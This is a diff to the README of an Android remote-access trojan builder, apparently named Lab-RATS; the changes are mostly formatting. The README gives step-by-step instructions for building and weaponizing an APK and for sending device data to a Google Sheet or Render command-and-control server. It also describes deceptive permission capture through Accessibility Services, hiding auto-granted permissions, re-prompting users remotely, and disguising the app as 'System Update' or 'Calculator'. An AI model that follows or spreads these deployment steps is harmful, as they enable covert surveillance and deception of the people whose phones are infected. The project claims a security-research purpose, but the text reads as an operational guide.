@@ -534,7 +474,7 @@ data.stealth === "true") ? "ACTIVE" : "OFF",
 <details>
   <summary><b>📸 View Render C2 Screenshot</summary></b>
   <br>
-  <img width="867" height="500" alt="Screenshot 2026-11-14 at 3 00 47 PM" src="https://github.com/user-attachments/assets/02cd24bc-ed70-421a-98ab-b8769b9dce52" />
+  <img width="767" height="400" alt="Screenshot 2026-11-14 at 3 00 47 PM" src="https://github.com/user-attachments/assets/02cd24bc-ed70-421a-98ab-b8769b9dce52" />
 </details>
 
 ---
@@ -545,34 +485,35 @@ data.stealth === "true") ? "ACTIVE" : "OFF",
 </p>
 
 ### 1. Build the APK (on PC)
-1.  **Download the Repository**:
-    ```
-    git clone https://github.com/K4N3CO/Lab-RATS.git
-    ```
-2.  **Navigate** to:
-    ```
-    cd /Lab-RATS/apk-builder/
-    ```
-3.  **Execute** the **Builder**:<br>
 
-    **Mac/Linux**:
-    ```
-    chmod +x build.sh && ./build.sh
-    ```
-    **Windows**:
-    ```
-    build.bat
-    ```
-5.  **Select a Build Strategy**:
-    *   **Option 1 (Manual)**: For **standard configuration** of **App Name, ID**, and **Logo** before **building**.
-    *   **Option 6 (Infection Chain Wizard)**: For the **Full Build → Host → Weaponize** flow.
+  #### Download the Repository:
+  ```
+  git clone https://github.com/K4N3CO/Lab-RATS.git
+  cd /Lab-RATS/apk-builder/
+  ```
+  #### Execute the Builder:
+  > **Mac/Linux**:
+  ```
+  chmod +x build.sh && ./build.sh
+  ```
+  > **Windows**:
+  ```
+  build.bat
+  ```
+
+  **Select a Build Strategy**:
+  
+   *   **Option 1 (Manual)**: For **standard configuration** of **App Name, ID**, and **Logo** before **building**.
+   *   **Option 6 (Infection Chain Wizard)**: For the **Full Build → Host → Weaponize** flow.
+
 > [!IMPORTANT]
-> 5.  **Enter** your **Google Sheet Webhook URL or Render URL** when **prompted to enable remote device IP reporting and connections** *("Command & Control Options" section above)*.
-6.  **Retrieve your** `signed.apk` *(and any weaponized payloads like PDFs or MP4s)* from `Lab-RATS/apk-builder/output/`
+>  **Enter** your **Google Sheet Webhook URL or Render URL** when **prompted to enable remote device IP reporting and connections** *("Command & Control Options" section above)*.
+
+  **Retrieve your** `signed_v*.apk` *(and any weaponized payloads like PDFs or MP4s)* from `Lab-RATS/apk-builder/output/`
 
 <details>
   <summary><b>📸 View APK-Builder Tool</summary></b>
-  <img src="https://github.com/user-attachments/assets/3b16fac1-c679-46d0-9e9d-57335c897313" alt="Full Web Page Screenshot" width="60%">
+  <img src="https://github.com/user-attachments/assets/3b16fac1-c679-46d0-9e9d-57335c897313" alt="Full Web Page Screenshot" width="40%">
 </details>
 
 ### 2. Deploy & Install onto Android Devices
@@ -613,11 +554,11 @@ data.stealth === "true") ? "ACTIVE" : "OFF",
     <li><strong>1. Manual Sideload:</strong><br>
   If you have <strong>physical access to the device</strong>, use <code>adb install signed.apk</code></li>
     <li><strong>2. Masked 'One-Click' Permission Granting (CRITICAL):</strong><br>
-  <strong>Open the app ONCE</strong>. <strong>Only the initial Pop-up <em>(Accessibility Services)</em> must be manually toggled on</strong>; <strong>ALL other permissions are now auto-granted & hidden by the system</strong> using a <strong>convincing security sequence</strong>.</li>
+  Open the app ONCE. Only the initial Pop-up <em>(Accessibility Services)</em> must be manually toggled on; <strong>ALL other permissions are now auto-granted & hidden by the system</strong> using a convincing security sequence.</li>
     <li><strong>3. Remote Permission Prompt:</strong><br>
   If a <strong>user removes any permissions</strong>, you can <strong>remotely trigger the system prompts again</strong> using the <strong>repair buttons</strong> in the <strong>GHOST UTILITIES</strong> section.</li>
     <li><strong>4. Self-Vanishing:</strong><br>
-  A <strong>few seconds after launch</strong>, the app will <strong>automatically replace its icon and name</strong> with the <strong>decoy you chose during build</strong> <em>("System Update", "Calculator"...etc)</em>.</li>
+  A few seconds after launch, the app will <strong>automatically replace its icon and name</strong> with the <strong>decoy you chose during build</strong> <em>("System Update", "Calculator"...etc)</em>.</li>
     <li><strong>5. Uplink Confirmation:</strong><br>
   Check your <strong>Google Sheet or Render C2</strong>. <strong>Within 5 seconds of initialization</strong>, the <strong>Device ID, Connection Type, IP, Port, C2 Dashboard Link, Battery % and more will appear in the log</strong>.</li>
   </ul>
@@ -653,7 +594,7 @@ data.stealth === "true") ? "ACTIVE" : "OFF",
   <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=28&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Support+the+Development" alt="Typing Banner"/>
 </p>
 
-**If** you find **Lab-RATS Awesome** and **Useful for your Testing & Security Research**, **Please Star ⭐ the project**—it **drives further development!**
+**If** you find **Lab-RATS Useful for your Testing & Security Research**, **Please Star ⭐ the project**—it **drives further development!**
 
 <p align="left">
   <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=20&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Contributions" alt="Typing Banner"/>
